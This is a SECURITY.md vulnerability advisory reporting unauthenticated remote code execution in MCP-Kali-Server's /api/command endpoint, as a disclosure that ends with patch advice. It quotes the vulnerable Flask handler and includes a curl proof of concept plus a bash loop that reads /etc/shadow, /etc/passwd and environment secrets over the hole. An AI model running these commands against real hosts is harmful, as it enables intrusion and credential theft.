# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported |
| --- | --- |
| 5.1.x | :white_check_mark: |
| 5.0.x | :x: |
| 4.0.x | :white_check_mark: |
| < 4.0 | :x: |

## Reporting a Vulnerability

## **Summary**

A Remote Code Execution (RCE) vulnerability exists in the MCP-Kali-Server project, specifically in the /api/command POST endpoint defined in kali_server.py.
This endpoint allows attackers to send arbitrary shell commands in the request body, which are then executed on the server without proper sanitization or input validation.
As a result, an unauthenticated attacker can gain full command execution capabilities on the server,
leading to a complete system compromise.

## **Description**

Root Cause (Vulnerable Code)   

- The /api/command POST endpoint directly accepts the command parameter from the client and executes it without any input validation or sanitization.
This allows malicious commands to be executed.
- The execute_command function runs the received command on the shell without any additional security checks, enabling arbitrary code execution.
- The server is bound to all network interfaces (0.0.0.0) via app.run(host="0.0.0.0", port=API_PORT, debug=DEBUG_MODE), making the API accessible from external networks without authentication.
- Because of these reasons, the system is vulnerable to Remote Code Execution (RCE), allowing unauthenticated attackers to execute arbitrary system commands remotely.

```python
def execute_command(command: str) -> Dict[str, Any]:
    """
    Execute a shell command and return the result
    
    Args:
        command: The command to execute
        
    Returns:
        A dictionary containing the stdout, stderr, and return code
    """
    executor = CommandExecutor(command)
    return executor.execute()

@app.route("/api/command", methods=["POST"])
def generic_command():
    """Execute any command provided in the request."""
    try:
        params = request.json
        command = params.get("command", "")
        
        if not command:
            logger.warning("Command endpoint called without command parameter")
            return jsonify({
                "error": "Command parameter is required"
            }), 400
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in command endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500
    
   . . . 

    app.run(host="0.0.0.0", port=API_PORT, debug=DEBUG_MODE)

```

**Intended Functionality (Normal Usage)**

Kali MCP Server provides an API that allows MCP clients to execute Linux terminal commands and various tools (such as nmap, curl, gobuster), supporting AI-assisted penetration testing and real-time solving of CTF challenges.

**Attack Method**

An attacker sends a crafted POST request to the /api/command endpoint with a malicious command in the JSON payload. Since the server executes the received command without proper validation or sanitization, the attacker can run arbitrary shell commands remotely, leading to Remote Code Execution (RCE). This allows the attacker to execute any command on the server with the same privileges as the MCP server process.

## **PoC**

```bash
#!/bin/bash

TARGET="http://192.168.152.200:5000/api/command"
CMD="whoami"

curl -s -X POST "$TARGET" -H "Content-Type: application/json" -d "{\"command\":\"$CMD\"}"
```

## **Attack**

The attacker can exploit a Remote Code Execution (RCE) vulnerability to run arbitrary shell commands on the target system.

```bash
#!/bin/bash

TARGET="http://192.168.152.200:5000/api/command"

COMMANDS=(
  "uname -a"
  "cat /etc/os-release"
  "hostname"
  "ifconfig -a"
  "netstat -tulnp"
  "iptables -L -n"
  "id"
  "cat /etc/passwd"
  "cat /etc/shadow"
  "ps aux"
  "env"
  "pwd"
  "ls -al /root"
  "ls -al /home"
  "ls -al /var/www/html"
)

run_command() {
  local cmd="$1"
  echo -e "\n[+] Running command: $cmd\n"
  curl -s -X POST "$TARGET" -H "Content-Type: application/json" -d "{\"command\":\"$cmd\"}" | grep -oP '"stdout":"\K([^"]*)' | sed 's/\\n/\n/g' | sed 's/\\r//g' | sed 's/\\//g'
}

for cmd in "${COMMANDS[@]}"; do
  run_command "$cmd"
done

```

## Result

![image](https://github.com/user-attachments/assets/e82ee527-904c-42c5-9b39-272ee2420aea)


## **Impact**

An attacker exploiting the Remote Code Execution (RCE) vulnerability can execute arbitrary system commands on the target server. This may lead to a complete system compromise, including unauthorized access to sensitive information, modification or deletion of critical files, and service disruption.

## **Patch Recommendation**

To mitigate Remote Code Execution (RCE) risks, all user inputs—especially the command parameter—should be thoroughly validated and sanitized before execution. Furthermore, avoid executing system commands directly based on user input; instead, use secure APIs or implement strict command whitelisting to limit execution scope.
